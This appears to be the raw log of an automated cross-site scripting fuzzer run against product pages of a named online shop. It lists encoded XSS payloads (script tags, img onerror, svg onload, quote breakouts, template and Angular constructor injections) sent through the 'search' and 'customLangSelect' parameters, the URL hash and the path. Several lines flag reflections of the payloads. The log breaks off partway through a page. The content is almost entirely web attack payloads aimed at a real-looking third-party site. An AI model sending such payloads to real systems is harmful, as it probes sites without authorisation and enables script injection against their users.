+   [→] Testing HASH (#): https://www.gravitychams.com/produkt/5faeb-2201-online-kaufen#javascript%3Aalert(1)
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/produkt/5faeb-2201-online-kaufen/javascript%3Aalert(1)
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/produkt/5faeb-2201-online-kaufen?customLangSelect=%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing QUERY (search): https://www.gravitychams.com/produkt/5faeb-2201-online-kaufen?search=%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing HASH (#): https://www.gravitychams.com/produkt/5faeb-2201-online-kaufen#%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/produkt/5faeb-2201-online-kaufen/%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/produkt/5faeb-2201-online-kaufen?customLangSelect=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+   [→] Testing QUERY (search): https://www.gravitychams.com/produkt/5faeb-2201-online-kaufen?search=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+   [→] Testing HASH (#): https://www.gravitychams.com/produkt/5faeb-2201-online-kaufen#%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/produkt/5faeb-2201-online-kaufen/%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/produkt/5faeb-2201-online-kaufen?customLangSelect=%3Csvg%20onload%3Dalert(1)%3E
+   [→] Testing QUERY (search): https://www.gravitychams.com/produkt/5faeb-2201-online-kaufen?search=%3Csvg%20onload%3Dalert(1)%3E
+   [→] Testing HASH (#): https://www.gravitychams.com/produkt/5faeb-2201-online-kaufen#%3Csvg%20onload%3Dalert(1)%3E
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/produkt/5faeb-2201-online-kaufen/%3Csvg%20onload%3Dalert(1)%3E
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/produkt/5faeb-2201-online-kaufen?customLangSelect=%22%60%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing QUERY (search): https://www.gravitychams.com/produkt/5faeb-2201-online-kaufen?search=%22%60%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing HASH (#): https://www.gravitychams.com/produkt/5faeb-2201-online-kaufen#%22%60%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/produkt/5faeb-2201-online-kaufen/%22%60%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/produkt/5faeb-2201-online-kaufen?customLangSelect=%24%7Balert(1)%7D
+   [→] Testing QUERY (search): https://www.gravitychams.com/produkt/5faeb-2201-online-kaufen?search=%24%7Balert(1)%7D
+   [🚨 API Data Reflection]: Injected code tracked returning through server endpoint: https://www.gravitychams.com/produkt/5faeb-2201-online-kaufen?search=%24%7Balert(1)%7D
+   [→] Testing HASH (#): https://www.gravitychams.com/produkt/5faeb-2201-online-kaufen#%24%7Balert(1)%7D
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/produkt/5faeb-2201-online-kaufen/%24%7Balert(1)%7D
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/produkt/5faeb-2201-online-kaufen?customLangSelect=%7B%7Bconstructor.constructor('alert(1)')()%7D%7D
+   [→] Testing QUERY (search): https://www.gravitychams.com/produkt/5faeb-2201-online-kaufen?search=%7B%7Bconstructor.constructor('alert(1)')()%7D%7D
+   [→] Testing HASH (#): https://www.gravitychams.com/produkt/5faeb-2201-online-kaufen#%7B%7Bconstructor.constructor('alert(1)')()%7D%7D
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/produkt/5faeb-2201-online-kaufen/%7B%7Bconstructor.constructor('alert(1)')()%7D%7D
+
+[*] Fuzzing mapped directory: https://www.gravitychams.com/produkt/4fbca4f-mdmb-binaca-online-kaufen
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/produkt/4fbca4f-mdmb-binaca-online-kaufen?customLangSelect=javascript%3Aalert(1)
+   [→] Testing QUERY (search): https://www.gravitychams.com/produkt/4fbca4f-mdmb-binaca-online-kaufen?search=javascript%3Aalert(1)
+   [🚨 API Data Reflection]: Injected code tracked returning through server endpoint: https://www.gravitychams.com/produkt/4fbca4f-mdmb-binaca-online-kaufen?search=javascript%3Aalert(1)
+   [→] Testing HASH (#): https://www.gravitychams.com/produkt/4fbca4f-mdmb-binaca-online-kaufen#javascript%3Aalert(1)
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/produkt/4fbca4f-mdmb-binaca-online-kaufen/javascript%3Aalert(1)
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/produkt/4fbca4f-mdmb-binaca-online-kaufen?customLangSelect=%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing QUERY (search): https://www.gravitychams.com/produkt/4fbca4f-mdmb-binaca-online-kaufen?search=%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing HASH (#): https://www.gravitychams.com/produkt/4fbca4f-mdmb-binaca-online-kaufen#%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/produkt/4fbca4f-mdmb-binaca-online-kaufen/%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/produkt/4fbca4f-mdmb-binaca-online-kaufen?customLangSelect=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+   [→] Testing QUERY (search): https://www.gravitychams.com/produkt/4fbca4f-mdmb-binaca-online-kaufen?search=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+   [→] Testing HASH (#): https://www.gravitychams.com/produkt/4fbca4f-mdmb-binaca-online-kaufen#%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/produkt/4fbca4f-mdmb-binaca-online-kaufen/%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/produkt/4fbca4f-mdmb-binaca-online-kaufen?customLangSelect=%3Csvg%20onload%3Dalert(1)%3E
+   [→] Testing QUERY (search): https://www.gravitychams.com/produkt/4fbca4f-mdmb-binaca-online-kaufen?search=%3Csvg%20onload%3Dalert(1)%3E
+   [→] Testing HASH (#): https://www.gravitychams.com/produkt/4fbca4f-mdmb-binaca-online-kaufen#%3Csvg%20onload%3Dalert(1)%3E
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/produkt/4fbca4f-mdmb-binaca-online-kaufen/%3Csvg%20onload%3Dalert(1)%3E
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/produkt/4fbca4f-mdmb-binaca-online-kaufen?customLangSelect=%22%60%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing QUERY (search): https://www.gravitychams.com/produkt/4fbca4f-mdmb-binaca-online-kaufen?search=%22%60%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing HASH (#): https://www.gravitychams.com/produkt/4fbca4f-mdmb-binaca-online-kaufen#%22%60%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/produkt/4fbca4f-mdmb-binaca-online-kaufen/%22%60%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/produkt/4fbca4f-mdmb-binaca-online-kaufen?customLangSelect=%24%7Balert(1)%7D
+   [→] Testing QUERY (search): https://www.gravitychams.com/produkt/4fbca4f-mdmb-binaca-online-kaufen?search=%24%7Balert(1)%7D
+   [🚨 API Data Reflection]: Injected code tracked returning through server endpoint: https://www.gravitychams.com/produkt/4fbca4f-mdmb-binaca-online-kaufen?search=%24%7Balert(1)%7D
+   [→] Testing HASH (#): https://www.gravitychams.com/produkt/4fbca4f-mdmb-binaca-online-kaufen#%24%7Balert(1)%7D
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/produkt/4fbca4f-mdmb-binaca-online-kaufen/%24%7Balert(1)%7D
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/produkt/4fbca4f-mdmb-binaca-online-kaufen?customLangSelect=%7B%7Bconstructor.constructor('alert(1)')()%7D%7D
+   [→] Testing QUERY (search): https://www.gravitychams.com/produkt/4fbca4f-mdmb-binaca-online-kaufen?search=%7B%7Bconstructor.constructor('alert(1)')()%7D%7D
+   [→] Testing HASH (#): https://www.gravitychams.com/produkt/4fbca4f-mdmb-binaca-online-kaufen#%7B%7Bconstructor.constructor('alert(1)')()%7D%7D
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/produkt/4fbca4f-mdmb-binaca-online-kaufen/%7B%7Bconstructor.constructor('alert(1)')()%7D%7D
+
+[*] Fuzzing mapped directory: https://www.gravitychams.com/produkt/7-add-online-kaufen
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/produkt/7-add-online-kaufen?customLangSelect=javascript%3Aalert(1)
+   [→] Testing QUERY (search): https://www.gravitychams.com/produkt/7-add-online-kaufen?search=javascript%3Aalert(1)
+   [🚨 API Data Reflection]: Injected code tracked returning through server endpoint: https://www.gravitychams.com/produkt/7-add-online-kaufen?search=javascript%3Aalert(1)
+   [→] Testing HASH (#): https://www.gravitychams.com/produkt/7-add-online-kaufen#javascript%3Aalert(1)
+   [→] Testing PATH-ROUTER: https://www.gravitychams.com/produkt/7-add-online-kaufen/javascript%3Aalert(1)
+   [→] Testing QUERY (customLangSelect): https://www.gravitychams.com/produkt/7-add-online-kaufen?customLangSelect=%3Cscript%3Ealert(1)%3C%2Fscript%3E
+   [→] Testing QUERY (search): https://www.gravitychams.com/produkt/7-add-online-kaufen?search=%3Cscript%3Ealert(1)%3C%2Fscript%3E
